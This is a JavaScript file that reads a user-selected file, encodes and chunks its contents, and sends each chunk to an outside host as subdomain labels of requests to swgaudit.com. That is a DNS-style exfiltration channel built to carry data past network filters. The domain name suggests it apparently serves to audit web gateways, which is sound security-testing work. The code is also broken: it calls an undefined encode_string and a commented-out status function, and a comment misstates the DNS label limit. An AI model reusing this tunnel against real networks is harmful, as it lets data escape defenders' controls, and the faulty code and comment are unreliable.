const MAX_SUBDOMAIN_LENGTH = 34; // Maximum length for each subdomain (standard DNS limit)
const DOMAIN = ".swgaudit.com"; // Domain to be appended

let totalRequests = 0; // Counter for total requests fired
let completedRequests = 0; // Counter for completed requests

// Event listener for file upload
const userFileInput = document.getElementById("usr_file_data");
userFileInput.addEventListener("change", function () {
    const file = this.files[0];
    if (!file) {
        console.error("Error: No file selected.");
        return;
    }

    const fileReader = new FileReader();
    fileReader.onload = function () {
        const data = fileReader.result;

        // Generate a new session ID for each file upload
        const sessionId = generateSessionId();
        const encodedData = encode_string(data);

        const chunks = splitIntoChunks(encodedData, MAX_SUBDOMAIN_LENGTH);

        // Reset counters
        totalRequests = chunks.length;
        completedRequests = 0;

        // Update UI with initial request count
        // updateRequestStatus();

        // Send requests for each chunk, with sessionId at the start, followed by chunk number and encoded chunk
        chunks.forEach((chunk, index) => {
            const chunkIndex = index + 1; // Chunk numbers start from 1
            const url = `https://${sessionId}.${chunkIndex}.${chunk}${DOMAIN}`;
            sendRequest(url);
        });

        // Show success message for file upload
        showSuccessMessage("File uploaded successfully! Requests are being processed.");
    };

    fileReader.onerror = function () {
        console.error("Error reading file:", fileReader.error);
    };

    fileReader.readAsText(file);
});

// Helper function to split a string into chunks of a given size
function splitIntoChunks(str, size) {
    const chunks = [];
    for (let i = 0; i < str.length; i += size) {
        chunks.push(str.slice(i, i + size));
    }
    return chunks;
}

// Helper function to send an HTTP GET request
function sendRequest(url) {
    const xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.onload = function () {
        if (xhr.status >= 200 && xhr.status < 300) {
            // console.log(`Request succeeded:`, xhr.responseText);
        } else {
            console.error(`Request failed with status ${xhr.status}`);
        }
        // Increment completed requests counter
        completedRequests++;
        updateRequestStatus();
    };
    xhr.onerror = function () {
        console.error("Request encountered a network error.");
        // Increment completed requests counter
        // completedRequests++;
        updateRequestStatus();
    };
    xhr.send(null);
}

// Helper function to generate a unique session ID
function generateSessionId() {
    // Use timestamp and a random number to create a unique session ID
    return `${Date.now()}-${Math.floor(Math.random() * 1000)}`;
}

// Function to show a success message
function showSuccessMessage(message) {
    const messageDiv = document.createElement("div");
    messageDiv.textContent = message;
    messageDiv.style.backgroundColor = "#2ecc71";
    messageDiv.style.color = "white";
    messageDiv.style.padding = "10px";
    messageDiv.style.borderRadius = "5px";
    messageDiv.style.marginTop = "20px";
    messageDiv.style.textAlign = "center";
    document.body.appendChild(messageDiv);

    // Remove the message after 5 seconds
    setTimeout(() => {
        messageDiv.remove();
    }, 5000);
}

// Function to update the request status
// function updateRequestStatus() {
//     let statusDiv = document.getElementById("request-status");
//     if (!statusDiv) {
//         statusDiv = document.createElement("div");
//         statusDiv.id = "request-status";
//         statusDiv.style.marginTop = "20px";
//         statusDiv.style.textAlign = "center";
//         document.body.appendChild(statusDiv);
//     }
//     statusDiv.textContent = `DNS Queries Fired: ${totalRequests}, Completed: ${completedRequests}`;
// }